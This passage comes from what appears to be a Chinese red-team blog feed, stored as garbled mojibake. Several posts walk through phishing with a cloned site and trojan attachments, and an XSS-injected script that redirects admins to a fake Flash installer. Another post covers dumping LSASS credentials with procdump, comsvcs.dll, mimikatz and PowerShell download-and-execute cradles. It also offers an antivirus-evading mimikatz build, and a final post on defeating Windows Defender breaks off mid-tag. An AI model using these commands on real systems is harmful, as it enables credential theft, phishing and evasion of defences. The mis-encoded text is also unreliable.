ç½‘ç«™é’“é±¼</h2><p>é‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹csä¸­çš„clone webçš„æ¨¡å—</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4107586241.png"></p><p>å¡«å…¥å…‹éš†ç½‘ç«™çš„urlï¼Œå¯ä»¥é€‰æ‹©è¿›è¡Œé”®ç›˜è®°å½•ï¼Œç„¶åç‚¹å‡»å°±èƒ½å…‹éš†ï¼Œä½†æ˜¯æœ‰äº›ç½‘ç«™ä¹Ÿå…‹éš†ä¸äº†ï¼Œå—åˆ°åè®®çš„ä¿æŠ¤ï¼Œé‚£ä¹ˆå…‹éš†å¥½ä¹‹åå°±å¯ä»¥ç‚¹å‡»è¿›è¡Œç®¡ç†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3764393512.png"></p><p>é‚£ä¹ˆå°±æ¥è®²è®²csä¸­çš„é‚®ä»¶é’“é±¼æ¿å—</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1831402730.png"></p><p>å¯¼å…¥æ”¶ä»¶äººï¼Œè¿™é‡Œé‚®ä»¶å’Œåå­—ä¸€å®šè¦ç”¨tabé”®åˆ†å¼€ï¼Œå†å¯¼å…¥æ¨¡æ¿çš„æ–‡ä»¶çš„æ—¶å€™ï¼Œå»é€‰æ‹©ä¸€å°ä½ éœ€è¦ä¼ªé€ çš„æ­£å¸¸æ–‡ä»¶ï¼Œç„¶åç‚¹å‡»é€‰æ‹©æ˜¾ç¤ºæ–‡ä»¶åŸæ–‡ï¼Œå¤åˆ¶ç²˜è´´å°±è¡Œï¼Œachmentå°±æ˜¯é™„ä»¶ï¼Œå¯ä»¥åŠ å…¥ä½ çš„å…æ€é©¬ï¼Œwordï¼Œä»€ä¹ˆçš„ï¼Œembedé¡¹å°±æ˜¯ç‚¹å‡»ä¹‹åè¦è·³è½¬çš„é¡µé¢ï¼Œé‚£ä¹ˆå¯ä»¥é…åˆclone webä½¿ç”¨ï¼Œå¡«å…¥æˆ‘ä»¬csæœåŠ¡å™¨å…‹éš†çš„ç½‘ç«™urlï¼Œç„¶åå°±æ˜¯è®¾ç½®é‚®ä»¶æœåŠ¡å™¨ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3448051565.png"></p><p>Bounce to é€‰é¡¹å°±æ˜¯ä½ ä¼ªé€ å¥½çš„é‚®ç®±ï¼Œä½ å¯ä»¥ä¼ªé€ æˆ<a href="mailto:&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;">&#x61;&#x64;&#x6d;&#x69;&#x6e;&#64;&#x71;&#113;&#46;&#x63;&#111;&#109;</a>ä»€ä¹ˆçš„ï¼Œä½†æ˜¯å¤§å¤šæ•°é‚®ä»¶æœåŠ¡å™¨æœ‰é˜²å¾¡ï¼Œä¼šæ˜¾ç¤ºä»£å‘äººï¼Œå‘ä¹‹å‰è¿˜å¯ä»¥ç‚¹å‡»Previewè¿›è¡Œé¢„è§ˆ<br>å†æ¥ç»™flashé’“é±¼ç½‘ç«™ï¼Œå½“æˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªç½‘ç«™çš„åå°ï¼Œé¡ºåˆ©è¿›å»äº†ï¼Œä½†æ˜¯ä»»ä½•getshellçš„ç‚¹ï¼Œå°±åªæ‰¾åˆ°ä¸€ä¸ªxssï¼Œé‚£ä¹ˆå¦‚ä½•getshellå˜ï¼Ÿè¿™æ—¶å€™å°±æ¥ä¸€æ³¢flashé’“é±¼æŠŠ<br>å»ºç«‹ç½‘ç«™</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4240948205.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2819329814.png"></p><p>æˆ‘ä»¬æ‰¾åˆ°index.htmlä¸­çš„ç«‹å³ä¸‹è½½æ‰€åœ¨çš„æ ‡ç­¾ï¼Œurlæ›¿æ¢æˆæˆ‘ä»¬çš„æœ¨é©¬ä¸‹è½½é“¾æ¥</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/358161573.png"></p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•è®©ç®¡ç†å‘˜é‡å®šå‘è¿‡æ¥ï¼Ÿè¿™é‡Œæ–°å»ºä¸€ä¸ªjsæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼Œç„¶åæˆ‘ä»¬çš„xssè„šæœ¬è°ƒç”¨è¿™æ®µjsæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">window.alert &#x3D; function(name) &#123;</span><br><span class="line">   var iframe &#x3D; document.createElement(&quot;IFRAME&quot;);</span><br><span class="line">   iframe.style.display&#x3D;&quot;none&quot;;</span><br><span class="line">   iframe.setAttribute(&quot;src&quot;,&#39;data:text&#x2F;plain,&#39;);</span><br><span class="line">   document.documentElement.appendChild(iframe);</span><br><span class="line">   window.frames[0].window.alert(name);</span><br><span class="line">   iframe.parentNode.removeChild(iframe);</span><br><span class="line">&#125;</span><br><span class="line">alert(&quot;æ‚¨çš„flashç‰ˆæœ¬è¿‡ä½ï¼Œå°è¯•å‡çº§åè®¿é—®è¯¥é¡µé¢ï¼&quot;);</span><br><span class="line">window.location.href&#x3D;&quot;http:&#x2F;&#x2F;www.xxx.com&quot;</span><br><span class="line">&lt;script src&#x3D;&quot;http:&#x2F;&#x2F;www.abc.flash.com.cn&#x2F;redirection.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>å½“ç„¶ä¸ºäº†ä¿é™©èµ·è§ï¼Œæˆ‘ä»¬å¾—é…åˆè‡ªè§£å‹é’“é±¼ï¼Œç°åœ¨å‹ç¼©çš„æ˜¯ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯æœ¨é©¬æ–‡ä»¶ï¼Œå¦ä¸€ä¸ªæ˜¯flashæ­£å¸¸å®‰è£…ç¨‹åºï¼Œä¸¤ä¸ªæ–‡ä»¶éƒ½å¾—æ‰§è¡Œï¼Œé€šè¿‡ä¿®æ”¹èµ„æºå›¾æ ‡ï¼Œä¼ªè£…æˆflashå®‰è£…ç¨‹åºï¼Œ<br>å°±å¯ä»¥getshelläº†ï¼</p><h2 id="8-unicodeåè½¬æ–‡ä»¶åç¼€é’“é±¼"><a href="#8-unicodeåè½¬æ–‡ä»¶åç¼€é’“é±¼" class="headerlink" title="8.unicodeåè½¬æ–‡ä»¶åç¼€é’“é±¼"></a>8.unicodeåè½¬æ–‡ä»¶åç¼€é’“é±¼</h2><p>Unicodeï¼ˆä¸­æ–‡ï¼šä¸‡å›½ç ã€å›½é™…ç ã€ç»Ÿä¸€ç ã€å•ä¸€ç ï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦é¢†åŸŸé‡Œçš„ä¸€é¡¹ä¸šç•Œæ ‡å‡†ã€‚å®ƒå¯¹ä¸–ç•Œä¸Šå¤§éƒ¨åˆ†çš„æ–‡å­—ç³»ç»Ÿè¿›è¡Œäº†æ•´ç†ã€ç¼–ç ï¼Œä½¿å¾—ç”µè„‘å¯ä»¥ç”¨æ›´ä¸ºç®€å•çš„æ–¹å¼æ¥å‘ˆç°å’Œå¤„ç†æ–‡å­—ã€‚è€Œå¦‚ä¸ŠæŠ€æœ¯æ­£æ˜¯ä½¿ç”¨äº†Unicodeçš„RLOï¼ˆå¼€å§‹ä»å·¦å‘å³è¦†ç›–ï¼‰ï¼ŒUnicodeå®šä¹‰çš„ Start of right-to-left overrideï¼Œæ§åˆ¶å­—ç¬¦æ˜¯RLOï¼ŒASCIIç æ˜¯0x3Fã€‚åªè¦åœ¨ä¸€è¡Œå­—ç¬¦å‰é¢åŠ ä¸Šä¸€ä¸ª0x3Få°±å¯ä»¥å®ç°æ–‡æœ¬çš„åå‘æ’åˆ—ã€‚è¿™ä¸ª0x3Fæ˜¯Unicodeä¸ºäº†å…¼å®¹é˜¿æ‹‰ä¼¯æ–‡å­—ä»å·¦è‡³å³çš„é˜…è¯»ä¹ æƒ¯è®¾è®¡çš„ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦ã€‚<br>é€‰æ‹©æœ¨é©¬ï¼Œé‡å‘½åï¼Œç„¶åç‚¹å‡»æ’å…¥unicodeæ§åˆ¶å­—ç¬¦</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2866579500.png"></p><p>å®Œæˆä¹‹å</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/464682027.png"></p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢é˜ŸæŠ€å·§-å¯¼å‡ºå‡­æ®å’Œå¯†ç </title>
      <link href="2021/02/17/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE%E5%92%8C%E5%AF%86%E7%A0%81/"/>
      <url>2021/02/17/%E7%BA%A2%E9%98%9F%E6%8A%80%E5%B7%A7-%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE%E5%92%8C%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çº¢é˜Ÿä¸­å„ç§æŠ“å–å¯†ç å‡­æ®çš„æ–¹æ³•ï¼Œæ–‡æœ«å½©è›‹ï¼Œå†…é™„å·¥å…·é“¾æ¥ï¼Œä»¥åŠæˆ‘åˆ¶ä½œçš„è¿‡360çš„minikatzçš„ç‰ˆæœ¬ï¼Œå„ä½è¯·äº«ç”¨ï¼Œæœ€è¿‘ç­¹å¤‡é‡æ–°å¼€blogï¼Œè®°å½•å­¦ä¹ è®¡åˆ’ï¼Œä¸ç„¶çŸ¥è¯†æˆ‘å­¦å®Œç«‹é©¬å°±å¿˜äº†ï¼Œä¸å¤§å®¶ä¸€èµ·å­¦ä¹ ï¼</p><h2 id="1-Procdumpè½¬å‚¨Lsass-exeçš„å†…å­˜"><a href="#1-Procdumpè½¬å‚¨Lsass-exeçš„å†…å­˜" class="headerlink" title="1.Procdumpè½¬å‚¨Lsass.exeçš„å†…å­˜"></a>1.Procdumpè½¬å‚¨Lsass.exeçš„å†…å­˜</h2><p>å‰æï¼šéœ€è¦ç®¡ç†å‘˜åŠä»¥ä¸Šæƒé™<br>å¸¸ç”¨å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump  -accepteula -ma lsass.exe lsass_dump</span><br></pre></td></tr></table></figure><p>å¯¼å‡ºçš„.dmpæ–‡ä»¶æœ¬åœ°é…åˆminikatz å–å‡ºå¯†ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::Minidump lsassdump.dmp</span><br><span class="line">sekurlsa::logonPasswords</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯¹lsass.exeæ•æ„Ÿçš„è¯ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥é…åˆlsass.exeçš„pidæ¥ä½¿ç”¨æ›´é¦™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump -accepteula -ma pid lsass.dmp</span><br></pre></td></tr></table></figure><h2 id="2-wceå¯¼å‡ºhash"><a href="#2-wceå¯¼å‡ºhash" class="headerlink" title="2.wceå¯¼å‡ºhash"></a>2.wceå¯¼å‡ºhash</h2><p>å‰æï¼šéœ€è¦ç®¡ç†å‘˜åŠä»¥ä¸Šæƒé™ï¼Œç‰ˆæœ¬é™åˆ¶ï¼ˆä»…æ”¯æŒWindows XPï¼Œ2003ï¼ŒVistaï¼Œ7ã€2008å’ŒWindows 8ï¼‰<br>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wce.exe -o file.txt</span><br><span class="line">wec.exe</span><br></pre></td></tr></table></figure><h2 id="3-comsvcs-dllè½¬å‚¨LSASS-exeå†…å­˜"><a href="#3-comsvcs-dllè½¬å‚¨LSASS-exeå†…å­˜" class="headerlink" title="3.comsvcs.dllè½¬å‚¨LSASS.exeå†…å­˜"></a>3.comsvcs.dllè½¬å‚¨LSASS.exeå†…å­˜</h2><p>å‰æï¼šåœ¨powershellä¸­è¿è¡Œï¼Œç®¡ç†å‘˜æƒé™ä»¥ä¸Š<br>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass.dmp full</span><br></pre></td></tr></table></figure><p>æ¸…ç†ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-Item $env:TEMP\lsass.dmp -ErrorAction Ignore</span><br></pre></td></tr></table></figure><h2 id="4-ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å’Œæ‹œæ‰˜hookçš„apiè½¬å‚¨LSASS-exeå†…å­˜"><a href="#4-ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å’Œæ‹œæ‰˜hookçš„apiè½¬å‚¨LSASS-exeå†…å­˜" class="headerlink" title="4.ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å’Œæ‹œæ‰˜hookçš„apiè½¬å‚¨LSASS.exeå†…å­˜"></a>4.ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨å’Œæ‹œæ‰˜hookçš„apiè½¬å‚¨LSASS.exeå†…å­˜</h2><p>è¯¦æƒ…è¯·æŸ¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;outflank.nl&#x2F;blog&#x2F;2019&#x2F;06&#x2F;19&#x2F;red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr&#x2F;</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ç¯‡éå¸¸niceçš„æ–‡ç« ï¼Œå€¼å¾—ä¸€çœ‹ï¼Œæ‰“å¼€ä¸€ä¸ªæ–°ä¸–ç•Œçš„å¤§é—¨ï¼<br>æœ‰å…³githubé¡¹ç›®ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;outflanknl&#x2F;Dumpert</span><br></pre></td></tr></table></figure><p>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dumpert_exe</span><br><span class="line">æˆ–è€…</span><br><span class="line">rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump</span><br></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœæˆªå›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1854110683.png"></p><h2 id="5-Windows-Task-Managerè½¬å‚¨LSASS-exeå†…å­˜"><a href="#5-Windows-Task-Managerè½¬å‚¨LSASS-exeå†…å­˜" class="headerlink" title="5.Windows Task Managerè½¬å‚¨LSASS.exeå†…å­˜"></a>5.Windows Task Managerè½¬å‚¨LSASS.exeå†…å­˜</h2><p>ç›´æ¥æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œæ‰¾åˆ°lsass.exeè¿›ç¨‹ï¼Œå³é”®é€‰ä¸­å³é”®</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1827568870.png"></p><h2 id="6-Mimikatz"><a href="#6-Mimikatz" class="headerlink" title="6.Mimikatz"></a>6.Mimikatz</h2><p>å‰æï¼šç®¡ç†å‘˜æƒé™ä»¥åŠä»¥ä¸Šï¼Œå»ºè®®è‡ªå·±ç¼–è¯‘æºç å»æ‰ä¸€äº›ç‰¹å¾å­—ç¬¦ï¼Œä¸€äº›ä¸å¿…è¦çš„è¯­å¥<br>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_exe &quot;sekurlsa::minidump lsass.dump&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>powershellï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#è¯»å–æ˜æ–‡å¯†ç </span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;mattifestation&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Invoke-Mimikatz.ps1&#39;); Invoke-Mimikatz â€“DumpCerts</span><br><span class="line">#è¯»å–hash</span><br><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;samratashok&#x2F;nishang&#x2F;master&#x2F;Gather&#x2F;Get-PassHashes.ps1&#39;);Get-PassHashes</span><br></pre></td></tr></table></figure><p>çŒ•çŒ´æ¡ƒæ€è½¯é‡ç‚¹çœ‹ç…§å¯¹è±¡ä¹‹ä¸€ã€‚</p><h2 id="7-pypykatzè¯»å–LSASS"><a href="#7-pypykatzè¯»å–LSASS" class="headerlink" title="7.pypykatzè¯»å–LSASS"></a>7.pypykatzè¯»å–LSASS</h2><p>å‰æï¼šå¿…é¡»å®‰è£…python3ï¼Œç®¡ç†å‘˜æƒé™ä»¥åŠä»¥ä¸Š<br>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#å®‰è£…</span><br><span class="line">pip install pypykatz</span><br><span class="line">#ä½¿ç”¨</span><br><span class="line">pypykatz live lsa</span><br></pre></td></tr></table></figure><p>æŠ“å¾—ä¸åªæ˜¯lsassï¼Œè¿˜æœ‰å…¶ä»–çš„ã€‚<br>è¿è¡Œæ•ˆæœï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2555028571.png"></p><p>æ€è½¯æ‹¦æˆªæ¦‚ç‡å¾ˆä½</p><h2 id="8-Out-Minidump-ps1è½¬å‚¨LSASS-exeå†…å­˜"><a href="#8-Out-Minidump-ps1è½¬å‚¨LSASS-exeå†…å­˜" class="headerlink" title="8.Out-Minidump.ps1è½¬å‚¨LSASS.exeå†…å­˜"></a>8.Out-Minidump.ps1è½¬å‚¨LSASS.exeå†…å­˜</h2><p>å‰æï¼špowershellï¼Œç®¡ç†å‘˜æƒé™ä»¥åŠä»¥ä¸Š<br>å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell â€œIEX (New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;mattifestation&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Out-Minidump.ps1&#39;); get-process lsass | Out-Minidumpâ€</span><br></pre></td></tr></table></figure><p>æ¸…é™¤æ–‡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore</span><br></pre></td></tr></table></figure><p>æ€è½¯ä¼šæ‹¦æˆªã€‚</p><h1 id="å½©è›‹ç¦åˆ©"><a href="#å½©è›‹ç¦åˆ©" class="headerlink" title="å½©è›‹ç¦åˆ©"></a>å½©è›‹ç¦åˆ©</h1><p>ç›´æ¥å»ä¸‹è½½githubä¸Šé¢çš„releaseç‰ˆæœ¬ç™¾åˆ†ä¹‹ç™¾è¢«æ€çš„ï¼Œæˆ‘è¿™æŠŠæºç æ‹‰ä¸‹æ¥ï¼Œè‡ªå·±ç¼–è¯‘ï¼Œå»é™¤ä¸€äº›ç‰¹å¾ã€‚<br>è¯·çœ‹ï¼šè¿‡360çš„minikatzæˆªå›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3397367405.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2620290165.png"></p><p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯æˆ‘åˆšæ›´æ–°æ²¡æœ‰å…³ç½‘ç»œï¼ŒæŠŠæˆ‘64ä½çš„ææ­»äº†ï¼Œä½†æ˜¯32ä½çš„ä¾ç„¶åšæŒºï¼ç„¶åæ¥ç€ä¿é™©èµ·è§ï¼ŒåŠ å£³<br>å·¥å…·åŒ…é‡Œé¢æœ‰æˆ‘ç¼–è¯‘å¥½çš„ä¸€äº›å·¥å…·ï¼Œæ‡‚å¾—éƒ½æ‡‚å—·ï¼Œä¸ä¼šçš„ç™¾åº¦ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/178237449.png"></p><blockquote><p>å…³æ³¨å…¬ä¼—å·Gammaå®éªŒå®¤å›å¤ï¼šminikatzï¼Œå³å¯è·å¾—ç™¾åº¦äº‘ä¸‹è½½é“¾æ¥ï¼Œé‡ç”³ä¸€éï¼Œæœ¬å…¬ä¼—å·åˆ†äº«çš„å·¥å…·ï¼ŒæŠ€æœ¯åªä¾›å­¦ä¹ ç ”ç©¶ï¼Œåˆ‡å‹¿æ‹¿å»è¿æ³•çŠ¯ç½ªï¼Œè¿æ³•çŠ¯ç½ªä¸å…¬ä¼—å·ä¸ä½œè€…æ— å…³ã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Powerviewè„šæœ¬å’ŒWindowsdefenderçš„æ©æ©æ€¨æ€¨</title>
      <link href="2021/02/15/Powerview%E8%84%9A%E6%9C%AC%E5%92%8CWindowsdefender%E7%9A%84%E6%81%A9%E6%81%A9%E6%80%A8%E6%80%A8/"/>
      <url>2021/02/15/Powerview%E8%84%9A%E6%9C%AC%E5%92%8CWindowsdefender%E7%9A%84%E6%81%A9%E6%81%A9%E6%80%A8%E6%80%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>èµ·å› ï¼Œæ˜¯æˆ‘æƒ³æµ‹è¯•ä¸€ä¸‹ï¼Œpowersploitçš„å…æ€æ•ˆæœï¼Œç„¶åå°±å»githubä¸‹è½½äº†powersploitçš„è„šæœ¬é›†åˆåŒ…ï¼Œpowerviewè„šæœ¬ä¹Ÿç»™é›†åˆè¿›å»äº†ï¼Œç„¶åå°±å¼•å‘äº†ä¸€äº›åˆ—æ„Ÿåˆ°ä»¤äººç–‘æƒ‘çš„äº‹ã€‚</p><h1 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a><strong>è¿‡ç¨‹</strong></h1><p>å½“æˆ‘å¯¼å…¥reconä¿¡æ¯æ”¶é›†æ¨¡å—çš„æ—¶å€™ï¼Œwindows defender æŠ¥æ¯’äº†ï¼Œç»™æˆ‘é˜»æ­¢äº†</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4219648887.png"></p><p>æŒ‰ç…§ä»¥å¾€çš„æŸ¥æ‰¾ç‰¹å¾ç æ‰‹æ³•ï¼Œæ˜¯æŒ¨ä¸ªæ–‡ä»¶è¯•ï¼Œç»“æœè¢«æˆ‘å‘ç°æ˜¯powerview.ps1è¿™ä¸ªè„šæœ¬è¢«windows defenderæŠ¥æ¯’ï¼ŒèŒƒå›´è¿›ä¸€æ­¥ç¼©å°ã€‚<br>ç„¶åå°±å¼€å§‹å…æ€windows defenderçš„å°è¯•ï¼Œæˆ‘å¼€å§‹æŠŠä¸€äº›è„šæœ¬é‡Œçš„ç‰¹å¾å­—ç¬¦ï¼Œå¤šä½™çš„å­—ç¬¦ï¼Œæ¯”å¦‚ä»€ä¹ˆä»‹ç»ï¼Œæ³¨é‡Šä»€ä¹ˆçš„éƒ½åˆ æ‰ï¼Œåˆ æ‰äº†ä¸€éƒ¨åˆ†<br>å†æ¬¡å°è¯•å¯¼å…¥ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/31578860.png"></p><p>ä¾ç„¶å¤±è´¥ï¼Œæˆ‘æŠŠwindows defender æ¥ç›´æ¥æ‰«ææ–‡ä»¶ï¼Œæ²¡æœ‰æŠ¥æ¯’ï¼Œè¯´æ˜é™æ€è¿‡äº†çš„ï¼Œé‚£è‚¯å®šæ˜¯åŠ¨æ€è¡Œä¸ºæ²¡è¿‡ã€‚<br>powershell è„šæœ¬è¿‡amsiæŒºå¤šæ–¹æ³•çš„ï¼Œæ¯”å¦‚å­—ç¬¦æ‹¼æ¥ï¼Œç¼–ç ï¼Œå˜é‡æ›¿æ¢ç­‰ç­‰ï¼Œä½†æ˜¯powerviewå¾ˆé•¿ä¸€æ®µçš„ä»£ç ï¼Œæˆ‘å¾—é€è¡Œå»è¯•ï¼Œå»æ‰¾ç‰¹å¾å­—ç¬¦ä¸²ï¼Œé‚£çœŸçš„éš¾å—æ­»äº†ã€‚<br>å› ä¸ºæˆ‘æœ¬äººä¹Ÿä¸æ˜¯å¾ˆæ‡‚powershellï¼Œæ‰€ä»¥æ²¡å»å°è¯•ï¼Œç„¶åæƒ³åˆ°ä¸€ä¸ªè¿‡windows defenderçš„åŠæ³•ï¼Œæ„Ÿè§‰æŒºç®€å•çš„<br>é‚£å°±æ˜¯ç”¨å…¶ä»–æ€æ¯’è½¯ä»¶å»æ¥ç®¡windowsçš„æ€æ¯’åŠŸèƒ½ï¼Œè¿™æ ·windows defenderå°±åªèƒ½æ­‡æ¯äº†ï¼Œå› ä¸ºæŸäº›åŸå› ï¼Œå›½å†…çš„æ€æ¯’è½¯ä»¶æ²¡æœ‰ä¸€ä¸ªä¼šè°ƒç”¨å¾®è½¯æä¾›çš„amsiè¿™ä¸ªæ¥å£ï¼Œæ‰€ä»¥å›½å†…çš„æ€æ¯’ç›¸å¯¹äºæ¥è¯´ï¼Œæ›´å¥½è¿‡ã€‚<br>ç„¶åæˆ‘å°±å®‰è£…ä¸ªç«ç»’ï¼ˆæ²¡æœ‰é’ˆå¯¹ç«ç»’ï¼Œåªæ˜¯ç¬¬ä¸€ä¸ªæƒ³åˆ°å®ƒè€Œå·²ï¼‰ï¼Œç„¶åå†æ¬¡å¯¼å…¥ï¼Œæ²¡æœ‰æ‹¦æˆª</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/757619212.png"></p><p>æœç„¶è¿˜æ˜¯å¾—ç”¨æ€è½¯å¯¹æŠ—æ€è½¯ï¼ç®€ç›´tql<br>ç„¶åæˆ‘æƒ³ç€ï¼Œè¿™ä¸Šæ¥å°±ç»™äººå®¶å®‰è£…ä¸ªæ€è½¯ï¼ŒåŠ¨é™å¤šå¤§å•Šï¼æˆ‘æœ‰é‚£ä¹ˆå¥½å¿ƒï¼Ÿ<br>ç„¶åæˆ‘ç»§ç»­åˆ åˆ å‡å‡ï¼Œç„¶åæˆ‘ç›´æ¥è·³åˆ°æœ€åï¼ŒåŠ æ¢è¡Œç¬¦ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/683658821.png"></p><p>åŠ äº†ä¸€äº›ï¼Œç„¶åç»§ç»­ï¼Œä¾ç„¶è¢«æ‹¦</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/649581227.png"></p><p>ä½†æ˜¯ä¸ä¼šæ–‡ä»¶ä¸ä¼šè¢«kaiiæ‰ï¼Œæ˜¯ä¸€ç§è¿›æ­¥ï¼Œä¸€æ¬¡å¶ç„¶å¾—æ“ä½œï¼Œæˆ‘æŠŠpowerviewè„šæœ¬ç§»åˆ°Desktopç›®å½•ä¸‹ï¼Œä¹Ÿå°±æ˜¯æ¡Œé¢</p><p><img 